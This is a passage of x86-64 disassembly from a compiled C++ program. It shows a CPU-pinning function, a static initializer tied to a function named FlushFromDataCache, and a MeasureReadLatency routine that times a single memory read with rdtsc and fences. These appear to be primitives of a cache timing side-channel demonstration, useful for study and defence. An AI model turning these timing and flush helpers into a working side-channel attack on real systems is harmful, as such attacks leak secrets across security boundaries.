    2195:	mov    ecx,0xf
    219a:	mov    rdi,rdx
    219d:	rep stos QWORD PTR es:[rdi],rax
    21a0:	mov    QWORD PTR [rsp],0x1
    21a8:	call   1160 <getpid@plt>
    21ad:	mov    edi,eax
    21af:	mov    rdx,rbx
    21b2:	mov    esi,0x80
    21b7:	call   10b0 <sched_setaffinity@plt>
    21bc:	test   eax,eax
    21be:	jne    21dc <_Z17PinToTheFirstCorev+0x6e>
    21c0:	mov    rax,QWORD PTR [rsp+0x88]
    21c8:	sub    rax,QWORD PTR fs:0x28
    21d1:	jne    2201 <_Z17PinToTheFirstCorev+0x93>
    21d3:	add    rsp,0x90
    21da:	pop    rbx
    21db:	ret
    21dc:	lea    rsi,[rip+0xede]        # 30c1 <_IO_stdin_used+0xc1>
    21e3:	lea    rdi,[rip+0x2e56]        # 5040 <_ZSt4cout@GLIBCXX_3.4>
    21ea:	call   10f0 <_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc@plt>
    21ef:	mov    rdi,rax
    21f2:	call   1060 <_ZSt4endlIcSt11char_traitsIcEERSt13basic_ostreamIT_T0_ES6_@plt>
    21f7:	mov    edi,0x1
    21fc:	call   1140 <exit@plt>
    2201:	call   1110 <__stack_chk_fail@plt>

0000000000002206 <_GLOBAL__sub_I__Z18FlushFromDataCachePKvS0_>:
    2206:	endbr64
    220a:	push   rbx
    220b:	lea    rbx,[rip+0x60ce]        # 82e0 <_ZStL8__ioinit>
    2212:	mov    rdi,rbx
    2215:	call   1170 <_ZNSt8ios_base4InitC1Ev@plt>
    221a:	lea    rdx,[rip+0x2de7]        # 5008 <__dso_handle>
    2221:	mov    rsi,rbx
    2224:	mov    rdi,QWORD PTR [rip+0x2dcd]        # 4ff8 <_ZNSt8ios_base4InitD1Ev@GLIBCXX_3.4>
    222b:	call   10d0 <__cxa_atexit@plt>
    2230:	pop    rbx
    2231:	ret

0000000000002232 <MeasureReadLatency>:
    2232:	mfence
    2235:	lfence
    2238:	rdtsc
    223a:	shl    rdx,0x20
    223e:	or     rax,rdx
    2241:	mov    r8,rax
    2244:	lfence
    2247:	mov    al,BYTE PTR [rdi]
    2249:	lfence
    224c:	rdtsc
    224e:	shl    rdx,0x20
    2252:	or     rax,rdx
    2255:	sub    rax,r8
    2258:	ret

Disassembly of section .fini:

000000000000225c <_fini>:
    225c:	endbr64
    2260:	sub    rsp,0x8
    2264:	add    rsp,0x8
    2268:	ret
